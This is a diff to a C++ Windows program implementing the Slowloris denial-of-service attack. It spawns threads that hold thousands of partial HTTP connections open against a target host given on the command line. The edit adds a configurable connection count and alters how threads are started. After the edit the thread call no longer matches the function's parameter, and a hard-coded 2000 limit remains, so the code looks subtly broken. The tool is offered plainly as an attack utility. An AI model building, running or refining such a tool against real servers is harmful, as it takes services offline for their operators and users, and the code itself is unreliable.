@@ -12,17 +12,18 @@
 
 int threads = 12;
 int connections = 2000;
+std::string url;
 
 class InputParser {
   public:
     InputParser(int& argc, char** argv) { for (int i = 1; i < argc; ++i) this->tokens.push_back(std::string(argv[i])); }
     const std::string& get_arg(const std::string& option) {
-      std::vector<std::string>::const_iterator itr;
-      itr = std::find(this->tokens.begin(), this->tokens.end(), option);
-      if (itr != this->tokens.end() && ++itr != this->tokens.end()) return *itr;
-      return std::string("");
-    }
-    bool arg_exists(const std::string& option) { return std::find(this->tokens.begin(), this->tokens.end(), option)  != this->tokens.end(); }
+    std::vector<std::string>::const_iterator itr;
+    itr = std::find(this->tokens.begin(), this->tokens.end(), option);
+    if (itr != this->tokens.end() && ++itr != this->tokens.end()) return *itr;
+    return std::string("");
+  }
+  bool arg_exists(const std::string& option) { return std::find(this->tokens.begin(), this->tokens.end(), option) != this->tokens.end(); }
   private:
     std::vector <std::string> tokens;
 };
@@ -33,7 +34,7 @@ void slowloris(PVOID p) {
   char header[] = "GET /";
   while (true) {
     std::chrono::milliseconds timeout((rand() % 10000 + 1) + 1000);
-    if (sockets.size() < 2000) {
+    if (sockets.size() < connections) {
       for (int i = sockets.size(); i < 2000; i++) {
         SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
         if (s != INVALID_SOCKET) {
@@ -62,8 +63,8 @@ int main(int argc, char* argv[]) {
   auto foo = WSAStartup(MAKEWORD(2, 2), &wsaData);
   if (!foo) {
     InputParser input(argc, argv);
-    std::string url;
     if (input.arg_exists("-t")) threads = atoi(input.get_arg("-t").c_str());
+    if (input.arg_exists("-c")) connections = atoi(input.get_arg("-c").c_str());
     if (input.arg_exists("-u")) url = input.get_arg("-u");
     if (!url.rfind("http://", 0)) url = url.substr(7);
     else if (!url.rfind("https://", 0)) url = url.substr(8);
@@ -74,7 +75,7 @@ int main(int argc, char* argv[]) {
     if (input.arg_exists("-p")) socket_address.sin_port = htons(strtoul(input.get_arg("-p").c_str(), NULL, 0));
     else socket_address.sin_port = htons(strtoul("80", NULL, 0));
     std::vector<std::thread> thread_vector;
-    for (int i = 0; i < threads; i++) thread_vector.push_back(std::thread(slowloris, &socket_address));
+    for (int i = 0; i < threads; i++) thread_vector.push_back(std::thread(slowloris));
     for (std::thread& thread : thread_vector) if (thread.joinable()) thread.join();
   }
 }
